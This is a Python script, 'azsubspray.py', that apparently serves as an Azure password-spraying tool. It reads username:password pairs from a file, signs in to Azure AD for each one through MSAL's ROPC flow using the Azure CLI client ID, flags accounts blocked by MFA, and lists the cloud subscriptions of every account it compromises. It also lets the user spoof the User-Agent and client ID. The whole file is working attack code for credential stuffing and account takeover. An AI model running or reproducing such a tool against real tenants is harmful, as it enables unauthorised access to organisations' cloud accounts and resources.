#!/usr/bin/env python3
"""
azsubspray.py

Reads a file with lines in the format:
  username@example.com:password123

Attempts ROPC (username/password) auth for each user (MSAL) and lists subscriptions.
NOT recommended for production. Will fail if the tenant or account blocks ROPC or if MFA is required.
"""

import sys
import os
import argparse
import requests
from msal import PublicClientApplication
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Defaults — can be overridden via args
CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
AUTHORITY = "https://login.microsoftonline.com/organizations"
SCOPE = ["https://management.azure.com/.default"]
AZURE_SUBS_URL = "https://management.azure.com/subscriptions?api-version=2020-01-01"

def try_list_subscriptions(username: str, password: str):
    app = PublicClientApplication(client_id=CLIENT_ID, authority=AUTHORITY)
    try:
        result = app.acquire_token_by_username_password(username=username, password=password, scopes=SCOPE)
    except Exception as e:
        print(f"{Fore.RED}[{username}] Exception during token acquisition: {e}")
        return

    if not result or "access_token" not in result:
        err = result or {}
        error_desc = err.get('error_description', '')
        if "multi-factor authentication" in error_desc.lower():
            print(f"{Fore.RED}[X] MFA Required - {username}")
        else:
            print(f"{Fore.RED}[X] Failed - {username}: {err.get('error')} - {error_desc}")
        return

    print(f"{Fore.GREEN}[✓] Success - {username}")
    token = result["access_token"]
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": USER_AGENT
    }

    try:
        resp = requests.get(AZURE_SUBS_URL, headers=headers, timeout=15)
    except Exception as e:
        print(f"{Fore.RED}[{username}] HTTP request exception: {e}")
        return

    if resp.status_code == 200:
        subs = resp.json().get("value", [])
        if not subs:
            print(f"\t{Fore.YELLOW}[>] No subscriptions found")
            return
        print(f"\t{Fore.YELLOW}[!] Subscriptions:")
        for s in subs:
            name = s.get("displayName", "<no-name>")
            sid = s.get("subscriptionId", "<no-id>")
            state = s.get("state", "<no-state>")
            print(f"\t  {Fore.CYAN}- {name} ({sid}) [{state}]")
    else:
        print(f"\t{Fore.RED}[X] Failed to list subscriptions: HTTP {resp.status_code}")
        try:
            print(resp.json())
        except Exception:
            print(resp.text)

def main():
    global CLIENT_ID, USER_AGENT

    print("== AzSubspray ==")

    parser = argparse.ArgumentParser(description="Spray Azure accounts to list subscriptions via ROPC.")
    parser.add_argument("userpassfile", help="File with username:password per line")
    parser.add_argument("--client-id", help="Override the Azure AD client ID")
    parser.add_argument("--user-agent", help="Custom User-Agent for subscription request")

    args = parser.parse_args()

    if args.client_id:
        CLIENT_ID = args.client_id
    if args.user_agent:
        USER_AGENT = args.user_agent

    print("Client ID:", CLIENT_ID)
    print("User Agent:", USER_AGENT)

    filepath = args.userpassfile
    if not os.path.isfile(filepath):
        print(f"{Fore.RED}File not found: {filepath}")
        sys.exit(1)

    with open(filepath, "r", encoding="utf-8") as f:
        lines = f.readlines()

    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            print(f"{Fore.RED}Skipping malformed line (no colon): {line}")
            continue
        username, password = line.split(":", 1)
        username = username.strip()
        password = password.rstrip("\n")
        if not username or not password:
            print(f"{Fore.RED}Skipping line with empty username or password: {line}")
            continue
        try_list_subscriptions(username, password)

if __name__ == "__main__":
    main()
